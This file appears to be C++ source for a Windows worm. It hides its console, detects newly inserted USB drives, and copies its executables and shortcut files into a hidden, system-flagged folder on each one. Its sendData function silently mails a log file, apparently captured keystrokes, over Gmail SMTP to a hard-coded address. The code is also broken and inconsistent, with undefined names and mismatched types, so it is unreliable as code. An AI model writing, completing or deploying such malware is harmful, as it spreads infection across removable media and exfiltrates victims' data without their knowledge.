#include <windows.h>
#include <time.h>
#include <string>
#include <fstream>

using namespace std;
char checkNewPendrives();
void infectDevices(char devices);
void sendData();

main () {
  FreeConsole();

  while (1) {
    char listofDevices = checkNewPendrives();
    if (listofDevices != "") {
      infectDevices(listofDevices);
    }
    else {
      sendData();
    }
    sleep(100000);
    if(!system("ping www.google.com -n 1")) {
      sendData();
      sleep(100000);
    }
    else{
      string listofDevices = checkNewPendrives();
      if (listofDevices != "") {
        infectDevices(listofDevices);
      }
    }
  }
}

char checkNewPendrives() {
  char drive='0';

    char szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
    string currentDrives="";

    for(int i=0; i<dwResult; i++){
        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90){
            currentDrives.append(1, szLogicalDrives[i]);

            if(allDrives.find(szLogicalDrives[i]) > 100){
                drive = szLogicalDrives[i];
            }
        }
    }

    allDrives = currentDrives;

    return drive;
}

void infectDevices(char devices) {
  char folderPath[10] = {devices};
    strcat(folderPath, ":\\");
    strcat(folderPath, FOLDER_NAME);

    if(CreateDirectory(folderPath ,NULL)){
        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);

        char run[100]={""};
        strcat(run, folderPath);
        strcat(run, "\\");
        strcat(run, RUN_FILE_NAME);
        CopyFile(RUN_FILE_NAME, run, 0);

        char net[100]={""};
        strcat(net, folderPath);
        strcat(net, "\\");
        strcat(net, EMAIL_SENDER_FILE_NAME);
        CopyFile(EMAIL_SENDER_FILE_NAME, net, 0);

        char infect[100]={""};
        strcat(infect, folderPath);
        strcat(infect, "\\");
        strcat(infect, INFECT_FILE_NAME);
        CopyFile(INFECT_FILE_NAME, infect, 0);

        char runlnk[100]={""};
        strcat(runlnk, folderPath);
        strcat(runlnk, "\\");
        strcat(runlnk, RUN_LINK_NAME);
        CopyFile(RUN_LINK_NAME, runlnk, 0);

        char infectlnk[100]={""};
        strcat(infectlnk, folderPath);
        strcat(infectlnk, "\\");
        strcat(infectlnk, INFECT_LINK_NAME);
        CopyFile(INFECT_LINK_NAME, infectlnk, 0);

        char hideCommand[100] = {""};
        strcat(hideCommand, "attrib +s +h +r ");
        strcat(hideCommand, folderPath);
        WinExec(hideCommand, SW_HIDE);
    }else{
        srand(time(0));
        int random = rand();

        if(random%2==0 || random%3==0 || random%7==0){
            return ;
        }
    }

    char infectlnkauto[100] = {devices};
    char* randomName = getRandomName();
    strcat(infectlnkauto, randomName);
    CopyFile(INFECT_LINK_NAME, infectlnkauto, 0);

}

void sendData() {
  char* command = "Transmit smtp://smtp.gmail.com:587 -v --mail-from \"ninedividebyzero@gmail.com\" --mail-rcpt \"ninedividebyzero@gmail.com\" --ssl -u ninedividebyzero@gmail.com:password -T \"Record.log\" -k --anyauth";
  WinExec(command, SW_HIDE);
}
